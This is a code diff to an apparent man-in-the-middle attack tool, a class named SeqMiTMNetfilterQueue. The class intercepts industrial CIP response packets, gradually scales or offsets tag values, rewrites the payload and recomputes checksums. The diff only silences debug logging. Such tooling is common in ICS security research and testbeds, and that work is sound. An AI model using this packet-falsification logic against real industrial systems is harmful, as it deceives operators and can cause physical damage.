@@ -79,18 +79,16 @@ class SeqMiTMNetfilterQueue(PacketQueue):
 
                 # 🔹 CIP response: Modify the value
                 elif len(p) == 102:
-                    if this_session in self.session_ids: # it works @ 19.2 1:28
+                    if this_session in self.session_ids:
                         value = translate_payload_to_float(payload)
 
                         tag_name = self.current_attacked_tag['tag']
 
-                        #add the value to the dictionary if it is different from the last one
-                        self.logger.debug(f"Tag name: {tag_name} | Value: {value} | Last value: {self.tag_real_last_values[tag_name]}, | Last modified value: {self.tag_Modified_last_values[tag_name]}, | Target IP: {p[IP].dst}")
-                        if value and value != self.tag_real_last_values[tag_name]  : # only modify the value with the scale param if it is different from the last one and for packets that goes to the target, charactherized by the dest ip with 192.168
-                        #if value and value != self.tag_real_last_values[tag_name] and '192.168' in p[IP].dst : # only modify the value with the scale param if it is different from the last one and for packets that goes to the target, charactherized by the dest ip with 192.168
+                        #self.logger.debug(f"Tag name: {tag_name} | Value: {value} | Last value: {self.tag_real_last_values[tag_name]}, | Last modified value: {self.tag_Modified_last_values[tag_name]}, | Target IP: {p[IP].dst}")
+                        if value and value != self.tag_real_last_values[tag_name]:
                             self.tag_real_last_values[tag_name] = value
                             self.tag_iterations[tag_name] += 1
-                            self.logger.debug(f"Iteration count for {tag_name}: {self.tag_iterations[tag_name]}")
+                            #self.logger.debug(f"Iteration count for {tag_name}: {self.tag_iterations[tag_name]}")
 
                             # 🔹 Apply scaling only every `scaleTime` iterations
                             if self.tag_iterations[tag_name] % self.current_attacked_tag['scaleTime'] == 0:
@@ -100,9 +98,7 @@ class SeqMiTMNetfilterQueue(PacketQueue):
                                 elif 'offset' in self.current_attacked_tag:
                                     self.current_attacked_tag['offset'] += self.current_attacked_tag['scaleParam']
                                     modified_value_total= value + self.current_attacked_tag['offset']
-                                self.logger.debug(f"@@@@@@@@@@@@@Updated@@@@@@@@@@@ {tag_name} | Iteration: {self.tag_iterations[tag_name]} | "
-                                                  f"New value: {self.current_attacked_tag.get('value', 'N/A')} | "
-                                                  f"New offset: {self.current_attacked_tag.get('offset', 'N/A')}")
+                                #self.logger.debug(f"Updated {tag_name} | Iteration: {self.tag_iterations[tag_name]} | " f"New value: {self.current_attacked_tag.get('value', 'N/A')} | "                  f"New offset: {self.current_attacked_tag.get('offset', 'N/A')}")
                                 self.tag_Modified_last_values[tag_name] = modified_value_total
 
                         # 🔹 Modify the packet payload
@@ -115,7 +111,7 @@ class SeqMiTMNetfilterQueue(PacketQueue):
                         else:
                             modified_value = value  # No change
 
-                        self.logger.debug(f"Modified {tag_name} | Offset {self.current_attacked_tag['offset']} | New Value: {modified_value} | Target IP: {p[IP].dst}")
+                        #self.logger.debug(f"Modified {tag_name} | Offset {self.current_attacked_tag['offset']} | New Value: {modified_value} | Target IP: {p[IP].dst}")
 
                         # 🔹 Recalculate checksums
                         del p[IP].chksum
